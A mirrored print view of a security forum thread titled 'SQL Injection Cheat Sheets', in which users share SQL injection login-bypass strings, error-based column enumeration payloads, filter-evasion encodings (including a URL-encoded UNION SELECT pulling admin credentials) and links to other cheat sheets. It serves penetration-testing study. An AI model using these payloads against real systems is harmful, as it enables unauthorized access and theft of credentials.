@@ -1,0 +1,314 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=363&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:33:06 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+	<base  /><!--[if IE]></base><![endif]-->
+	<meta name="generator" content="vBulletin 4.2.1" />
+
+	
+	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	
+
+
+
+	<title> SQL Injection Cheat Sheets</title>
+	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+<body>
+
+<div class="above_body">
+<div id="header" class="floatcontainer">
+<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+</div>
+</div>
+<div class="body_wrapper">
+<div id="pagetitle">
+	<h1><a href="showthreada08c.html?t=363">SQL Injection Cheat Sheets</a></h1>
+	<p class="description">Printable View</p>
+</div>
+
+
+	<div class="floatcontainer">
+		<a class="maxperpage" href="printthread28fe.html?t=363&amp;pp=40">Show 40 post(s) from this thread on one page</a>
+		<div id="pagination_top">
+			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=363&amp;pp=10&amp;page=2" method="get" class="pagination popupmenu nohovermenu">
+<input type="hidden" name="t" value="363" /><input type="hidden" name="pp" value="10" />
+	
+		<span><a href="javascript://" class="popupctrl">Page 1 of 2</a></span>
+		
+		
+		
+		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 14">1</a></span><span><a href="printthread2ea1.html?t=363&amp;pp=10&amp;page=2" title="Show results 11 to 14 of 14">2</a></span>
+		
+		
+		<span class="prev_next"><a rel="next" href="printthread2ea1.html?t=363&amp;pp=10&amp;page=2" title="Next Page - Results 11 to 14 of 14"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		
+		
+		<span class="first_last"><a href="printthread2ea1.html?t=363&amp;pp=10&amp;page=2" title="Last Page - Results 11 to 14 of 14">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		
+	
+	<ul class="popupbody popuphover">
+		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+	</ul>
+</form>
+		</div>
+	</div>
+
+
+<ul id="postlist">
+	<li class="postbit blockbody" id="post_1">
+	<div class="header">
+		<div class="datetime">09-28-2010, 11:49 PM</div>
+		<span class="username">AnArKI</span>
+	</div>
+	
+	
+		<div class="title">SQL Injection Cheat Sheets</div>
+	
+	<div class="content">
+		<blockquote class="restore">Though there are lot of websites which provide cheat sheets I thought we should maintain and update our own Cheat Sheets.please update you favorite or newly learned SQL Injection Cheat sheets here.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_2">
+	<div class="header">
+		<div class="datetime">09-28-2010, 11:51 PM</div>
+		<span class="username">AnArKI</span>
+	</div>
+	
+	
+		<div class="title">Basic Login Tricks</div>
+	
+	<div class="content">
+		<blockquote class="restore">admin' -- <br />
+admin' # <br />
+admin'/*<br />
+' or 1=1--<br />
+' or 1=1#<br />
+' or 1=1/*<br />
+') or '1'='1--<br />
+') or ('1'='1--</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_3">
+	<div class="header">
+		<div class="datetime">09-29-2010, 01:04 AM</div>
+		<span class="username">AnArKI</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Finding Column Names with HAVING BY - Error Based <br />
+<br />
+' HAVING 1=1 -- <br />
+' GROUP BY table.columnfromerror1 HAVING 1=1 -- <br />
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --<br />
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- <br />
+<br />
+and so on</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_4">
+	<div class="header">
+		<div class="datetime">09-29-2010, 09:09 AM</div>
+		<span class="username">prashant_uniyal</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Nice initiative bro..Here's the best cheat sheet on sql injections by Ferruh mavituna<br />
+<br />
+<a href="../external.html?link=http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/" target="_blank">http://ferruh.mavituna.com/sql-injec...heatsheet-oku/</a></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_5">
+	<div class="header">
+		<div class="datetime">12-16-2010, 01:57 PM</div>
+		<span class="username">abhaythehero</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">Informix SQL Injection Cheat Sheet<br />
+ 	MSSQL Injection Cheat Sheet<br />
+	Oracle SQL Injection Cheat Sheet<br />
+	MySQL SQL Injection Cheat Sheet<br />
+	Postgres SQL Injection Cheat Sheet<br />
+	DB2 SQL Injection Cheat Sheet<br />
+	Ingres SQL Injection Cheat Sheet <br />
+<br />
+<a href="../external.html?link=http://pentestmonkey.net/index.php?option=com_content&amp;task=category&amp;sectionid=9&amp;id=24&amp;Itemid=1" target="_blank">http://pentestmonkey.net/index.php?o...id=24&amp;Itemid=1</a></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_6">
+	<div class="header">
+		<div class="datetime">12-17-2010, 01:53 AM</div>
+		<span class="username">ajaysinghnegi</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">SQL Injection Cheat Sheets List<br />
+<a href="../external.html?link=http://www.diigo.com/list/fmavituna/sql-injection-cheat-sheets" target="_blank">http://www.diigo.com/list/fmavituna/...n-cheat-sheets</a></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_7">
+	<div class="header">
+		<div class="datetime">12-17-2010, 07:26 AM</div>
+		<span class="username">b0nd</span>
+	</div>
+	
+	
+		<div class="title">Reiners' Weblog and SQL IT tool</div>
+	
+	<div class="content">
+		<blockquote class="restore"><a href="../external.html?link=http://websec.wordpress.com/" target="_blank">Reiners' Weblog</a> : His blog is a good resource for various SQL injection techniques including filter evasion.<br />
+<br />
+________________________________________<br />
+<br />
+<a href="../external.html?link=http://evil.hackademix.net/sqlit/" target="_blank">SQL Inject Toy (SQL IT)</a><br />
+<br />
+In order to avoid SQL Injection there could be some &quot;string&quot; filtering.<br />
+e.g. UNION, SELECT, ORDER BY can be put in a blacklist.<br />
+Sometimes uNiOn, SeLecT etc. may work if &quot;case sensitivity&quot; has not been considered.<br />
+<br />
+But to make things worse none of the following works sometime:<br />
+<div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			uNion<br />
+'uN'/**/'i'/**/'on'<br />
+unhex(hex(union))<br />
+0x(hex value of union)
+			
+		<hr />
+	</div>
+</div>etc.<br />
+<br />
+Example: <div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			Using the SQL IT tool, it converts the string UNION ALL SELECT 1, concat(admin_id,admin_pass), 3, 4, 5, 6 FROM admin--<br />
+to<br />
+%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%2  0%31%2c%20%63%6f%6e%63%61%74%28%61%64%6d%69%6e%5f%  69%64%2c%61%64%6d%69%6e%5f%70%61%73%73%29%2c%20%33  %2c%20%34%2c%20%35%2c%20%36%20%46%52%4f%4d%20%61%6  4%6d%69%6e%2d%2d%20
+			
+		<hr />
+	</div>
+</div>and helps bypass the filtering.</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_8">
+	<div class="header">
+		<div class="datetime">03-17-2012, 10:21 PM</div>
+		<span class="username">ajaysinghnegi</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">SQL Injection Cheat Sheet w/ filter evasion<br />
+<br />
+<a href="../external.html?link=http://ha.ckers.org/sqlinjection/" target="_blank">http://ha.ckers.org/sqlinjection</a><br />
+<br />
+<br />
+Other SQL Injection Cheat Sheets:<br />
+<br />
+<a href="../external.html?link=http://www.red-database-security.com/whitepaper/oracle_sql_injection_web.html" target="_blank">Oracle SQL Injection via Web</a></blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_9">
+	<div class="header">
+		<div class="datetime">04-18-2012, 11:26 PM</div>
+		<span class="username">Deepak Rathore</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore">I am still confuse with a que.How meta-characters work with sql injection? How sql injection works?How a single qoute works,what it will do when we put in url or a field,how we receive an error msg?</blockquote>
+	</div>
+</li><li class="postbit blockbody" id="post_10">
+	<div class="header">
+		<div class="datetime">04-19-2012, 10:12 AM</div>
+		<span class="username">amolnaik4</span>
+	</div>
+	
+	
+	<div class="content">
+		<blockquote class="restore"><div class="bbcode_container">
+	<div class="bbcode_description">Quote:</div>
+	<div class="bbcode_quote printable">
+		<hr />
+		
+			<div>
+				Originally Posted by <strong>Deepak Rathore</strong>
+				<a href="showthreadc613.html?p=7561#post7561" rel="nofollow"><img class="inlineimg" src="images/buttons/viewpost.html" alt="View Post" /></a>
+			</div>
+			<div class="message">I am still confuse with a que.How meta-characters work with sql injection? How sql injection works?How a single qoute works,what it will do when we put in url or a field,how we receive an error msg?</div>
+			
+		<hr />
+	</div>
+</div>Hey Deepak,<br />
+YOu should checkout &quot;Garage4Hackers Ranchoddas Series of Webcasts-SQL Injection: Novice to Ninja&quot; which will I guess clear your doubts.<br />
+<a href="../external.html?link=http://www.garage4hackers.com/f2/garage4hackers-ranchoddas-series-webcasts-sql-injection-novice-ninja-2114.html" target="_blank">http://www.garage4hackers.com/f2/gar...inja-2114.html</a><br />
+<br />
+AMol NAik</blockquote>
+	</div>
+</li>
+</ul>
+
+
+	<div class="floatcontainer">
+		<a class="maxperpage" href="printthread28fe.html?t=363&amp;pp=40">Show 40 post(s) from this thread on one page</a>
+		<div id="pagination_bottom">
+			<form action="../external.html?link=http://garage4hackers.com/printthread.php?t=363&amp;pp=10&amp;page=2" method="get" class="pagination popupmenu nohovermenu">
+<input type="hidden" name="t" value="363" /><input type="hidden" name="pp" value="10" />
+	
+		<span><a href="javascript://" class="popupctrl">Page 1 of 2</a></span>
+		
+		
+		
+		<span class="selected"><a href="javascript://" title="Results 1 to 10 of 14">1</a></span><span><a href="printthread2ea1.html?t=363&amp;pp=10&amp;page=2" title="Show results 11 to 14 of 14">2</a></span>
+		
+		
+		<span class="prev_next"><a rel="next" href="printthread2ea1.html?t=363&amp;pp=10&amp;page=2" title="Next Page - Results 11 to 14 of 14"><img src="images/pagination/next-right.html" alt="Next" /></a></span>
+		
+		
+		<span class="first_last"><a href="printthread2ea1.html?t=363&amp;pp=10&amp;page=2" title="Last Page - Results 11 to 14 of 14">Last<img src="images/pagination/last-right.html" alt="Last" /></a></span>
+		
+	
+	<ul class="popupbody popuphover">
+		<li class="formsubmit jumptopage"><label>Jump to page: <input type="text" name="page" size="4" /></label> <input type="submit" class="button" value="Go" /></li>
+	</ul>
+</form>
+		</div>
+	</div>
+
+</div>
+<div class="below_body">
+<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:07 PM</span>.</div>
+
+<div id="footer_copyright" class="footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+</div>
+ 
+</div>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+
+<!-- Mirrored from garage4hackers.com/printthread.php?t=363&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 16:33:06 GMT -->
+</html>
